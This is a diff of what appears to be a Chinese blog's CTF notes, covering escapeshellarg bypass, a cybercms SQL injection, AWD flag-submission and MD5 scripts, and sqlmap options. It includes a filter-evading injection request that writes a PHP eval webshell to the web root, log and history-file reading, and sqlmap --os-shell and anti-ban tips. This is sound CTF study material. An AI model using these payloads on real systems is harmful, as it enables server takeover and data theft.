@@ -210,8 +210,14 @@
 <p>猜测命令执行查看历史命令文件</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ~&#x2F;.bash_history</span><br></pre></td></tr></table></figure>
 
-<p>但是<code>escapeshellarg()</code>函数不会绕过。。。</p>
+<p><code>escapeshellarg()</code>函数  把字符串转码为可以在 shell 命令里使用的参数，不会绕过。。。</p>
 <p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">记录</a></p>
+<p>看过wp才知道要想读日志，nginx日志默认路径<code>/var/log/nginx/access.log</code></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123025756.png" alt="image-20210820123025756"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820123606239.png" alt="image-20210820123606239"></p>
+<p><code>escapeshellarg()</code>利用非ascii字符绕过，%aa,%ba,%fa</p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125330839.png" alt="image-20210820125330839"></p>
+<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20210820125339970.png" alt="image-20210820125339970"></p>
 <h4 id="YApi"><a href="#YApi" class="headerlink" title="YApi"></a>YApi</h4><p>版本1.9.1   刚爆出个漏洞。</p>
 <p>注册，创建项目</p>
 <p><img src="/2021/08/01/21DASCTFJuly/image-20210801180737592.png" alt="image-20210801180737592"></p>
@@ -246,6 +252,30 @@
 <p>找到flag</p>
 <p><img src="/2021/08/01/21DASCTFJuly/image-20210801183006727.png" alt="image-20210801183006727"></p>
 <p><a href="https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ">参考</a></p>
+<h4 id="cybercms"><a href="#cybercms" class="headerlink" title="cybercms"></a>cybercms</h4><p>根据网上爆出了sql注入，在后台登陆处，</p>
+<p>然后根据目录扫描<a href="http://www.zip/">www.zip</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$password</span>=fl_html(f1_vvv(fl_value(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">f1_vvv  函数</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1_vvv</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\ /i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;Go away,bad hacker!!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	preg_replace(<span class="string">&#x27;/0x/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$str</span>))&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="keyword">return</span> preg_replace(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\.\.\/|\.\/| union | from | where | group | into |load_file</span></span><br><span class="line"><span class="string">|outfile/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析源码得到过滤了<code>空格</code>和<code>0x</code>，fl_value函数对一些关键词做了过滤，</p>
+<p>判断5列</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912182056650.png" alt="image-20210912182056650"></p>
+<p>但是后门写马时候也要注意部分关键字被replace为空格</p>
+<p>后门马</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184824092.png" alt="image-20210912184824092"></p>
+<p>例如</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">user&#x3D;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;outfile&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&amp;password&#x3D;dd&amp;code&#x3D;&amp;submit&#x3D;true&amp;submit.x&#x3D;16&amp;submit.y&#x3D;29</span><br></pre></td></tr></table></figure>
+
+<p>response</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bad！hacker！&lt;br&gt;sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name&#x3D;&#39;admin&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;&#x2F;**&#x2F;null,null,null,null,CHAR(60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,63,62)&#x2F;**&#x2F;into&#x2F;**&#x2F;&#x2F;**&#x2F;&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;shell.php&#39;#&#39; limit 0,1</span><br></pre></td></tr></table></figure>
+
+<p>select，outfile要双写</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183311495.png" alt="image-20210912183311495">、</p>
+<p>查看后门</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912183414063.png" alt="image-20210912183414063"></p>
+<p>命令执行</p>
+<p><img src="/2021/08/01/21DASCTFJuly/image-20210912184256103.png" alt="image-20210912184256103"></p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -684,6 +714,16 @@
 <h2 id="0x04awd-sendflag"><a href="#0x04awd-sendflag" class="headerlink" title="0x04awd_sendflag"></a>0x04awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    <span class="built_in">print</span>(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+
+
+<h2 id="0x05-生成以指定字符为开头的md5值"><a href="#0x05-生成以指定字符为开头的md5值" class="headerlink" title="0x05 生成以指定字符为开头的md5值"></a>0x05 生成以指定字符为开头的md5值</h2><ul>
+<li>百度的</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 脚本功能：生成以指定字符为开头的md5值（x位数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">11111111</span>,<span class="number">99999999</span>))  <span class="comment">#爆破范围</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;66666&quot;</span>  <span class="comment">#md5指定前几位</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Test %s &quot;</span> % strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;完成！&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>结果如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>python</category>
@@ -700,40 +740,43 @@
 </blockquote>
 <h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>常见指令:</p>
 <ul>
-<li><p>-u               指定url</p>
+<li><p><code>-u</code>               指定url</p>
 </li>
-<li><p>–dbs          获得数据库</p>
+<li><p><code>--dbs</code>          获得数据库</p>
 </li>
-<li><p>–tables      获得表</p>
+<li><p><code>--tables</code>      获得表</p>
 </li>
-<li><p>–columns  获得字段</p>
+<li><p><code>--columns</code>  获得字段</p>
 </li>
-<li><p>–dump       枚举所有数据</p>
+<li><p><code>--dump   </code>    枚举所有数据</p>
 </li>
 <li><p>-D 库名   -T 表名  - C 字段</p>
-<span id="more"></span></li>
-<li><p>–forms          让sqlmap自己寻找页面表单</p>
+<span id="more"></span>
+</li>
+<li><p><code>--forms  </code>        让sqlmap自己寻找页面表单</p>
 <p>为了防止被ban，还需下面操作</p>
 </li>
-<li><p>–count        查询数据量</p>
+<li><p><code>--count   </code>     查询数据量</p>
 </li>
-<li><p>–random-agent 构造随机user-agent</p>
+<li><p><code>--random-agent</code> 构造随机user-agent</p>
 </li>
-<li><p>–delay=2     延迟2秒</p>
+<li><p><code>--delay=2</code>     延迟2秒</p>
 </li>
-<li><p>–level 1-5（默认为1，低等级，如果跑不出来可以加高等级）</p>
+<li><p><code>--level 1-5</code>（默认为1，低等级，如果跑不出来可以加高等级）</p>
+</li>
+<li><p><code>--tamper  xxxxx.py</code>  调用tamper脚本</p>
 </li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https:xxxx.com?id&#x3D;1&quot; --dbs --count</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>–is-dba          查看权限是否为root，如果显示DBA为TRUE   可以尝试直接webshell</p>
+<li><p><code>--is-dba</code>          查看权限是否为root，如果显示DBA为TRUE   可以尝试直接webshell</p>
 </li>
-<li><p>–os-shell   尝试拿shell</p>
+<li><p><code>--os-shell</code>   尝试拿shell</p>
 </li>
-<li><p>–batch  不询问输入，全部默认确定</p>
+<li><p><code>--batch</code>  不询问输入，全部默认确定</p>
 </li>
-<li><p>-v               显示详细的输出等级（-v 3 会显示Payload）</p>
+<li><p><code>-v </code>              显示详细的输出等级（-v 3 会显示Payload）</p>
 </li>
 </ul>
 ]]></content>
